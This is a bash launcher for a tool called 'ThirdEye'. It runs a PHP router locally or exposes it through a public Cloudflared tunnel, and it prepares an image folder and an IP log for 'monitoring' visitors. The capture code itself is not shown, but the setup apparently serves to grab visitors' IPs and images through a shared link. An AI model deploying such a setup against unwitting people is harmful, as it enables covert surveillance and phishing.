#!/bin/bash

# Author: Haitham Aouati
# GitHub: github.com/haithamaouati

# Colors
nc="\e[0m"
bold="\e[1m"
underline="\e[4m"
bold_green="\e[1;32m"
bold_red="\e[1;31m"
bold_yellow="\e[1;33m"

# Dependency check
for cmd in php cloudflared; do
    if ! command -v "$cmd" &>/dev/null; then
        echo "Error: $cmd is required but not installed." >&2
        exit 1
    fi
done

if [ ! -d "images" ]; then
    mkdir images
fi

if [ ! -f "ip_logs.txt" ]; then
    touch ip_logs.txt
fi

# ASCII Banner
banner() {
    clear
    echo -e "${bold_green}"
    cat <<"EOF"
⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣼⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⡟⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣦⣠⡀⠀⠀⠀⠀⢸⡿⠀⠸⣧⠀⠀⠀⠀⠀⠀⣧⣾⠀⠀⠀
⠀⠀⠸⡇⠉⠻⣄⠀⠀⠀⣾⠁⠀⠀⢹⡆⠀⠀⢀⣴⠟⠁⣿⠀⠀⠀
⠀⠀⠀⣻⠀⠀⠈⠳⣄⠀⣿⠀⣤⣤⢸⣇⠀⣠⠞⠁⠀⢰⠇⠀⠀⠀
⠀⠀⠀⠐⢧⡀⣴⣦⢻⡄⣿⠀⢿⠟⢈⡟⣸⢃⣴⡄⢀⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢮⡛⠀⢳⢻⣆⠀⠀⣼⢇⠃⠈⢛⡵⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠛⠢⣜⡆⢻⡄⣸⠏⣼⡤⠖⠛⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⢿⡏⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
EOF
    echo -e "         ThirdEye${nc}\n"
    echo -e " Author: Haitham Aouati"
    echo -e " GitHub: ${underline}github.com/haithamaouati${nc}\n"
}

# Ask the user for server mode choice

main_menu() {
    echo -e "Choose your running mode:\n"
    echo -e "${bold}[1]${nc} Cloudflared Tunnel"
    echo -e "${bold}[2]${nc} Localhost (127.0.0.1:8080)"
    echo -e "${bold_red}[3]${nc} Exit\n"
    echo -e -n "Choice: "
    read choice
    sleep 1

    case $choice in
        1)
            run_public
            ;;
        2)
            run_local
            ;;
        3)
            echo -e "\n${bold_red}Goodbye!${nc}\n"
            killall php 2>/dev/null
            exit 0
            ;;
        *)
            echo -e "\n${bold_red}[!]${nc} Invalid option. Please try again."
            sleep 2
            main_menu
            ;;
    esac
}

# Cloudflared Tunnel

run_public() {
    # Start PHP Server in the background
    echo -e "\n${bold_yellow}[*]${nc} Starting PHP Server on 127.0.0.1:8080"
    php -S 127.0.0.1:8080 router.php > /dev/null 2>&1 & 
    PHP_PID=$!

    sleep 2

    # Start Cloudflared Tunneling
    echo -e "${bold_yellow}[*]${nc} Generating the Cloudflared public tunnel link..."
    echo -e "${bold_yellow}[*]${nc} Monitoring will begin once the public URL appears..."

    cloudflared tunnel --url 127.0.0.1:8080

    # Stopped
    echo -e "${bold_red}[!]${nc} Terminating PHP server.\n"
    kill $PHP_PID 2>/dev/null
}

# Run server on localhost (No Tunneling)

run_local() {
    # Starting PHP Server in foreground
    echo -e "\n${bold_yellow}[*]${nc} Starting PHP Server on 127.0.0.1:8080"
    echo -e "${bold_green}[+]${nc} Real-time monitoring started.\n"

    # Show server logs
    php -S 127.0.0.1:8080 router.php
}

banner
main_menu
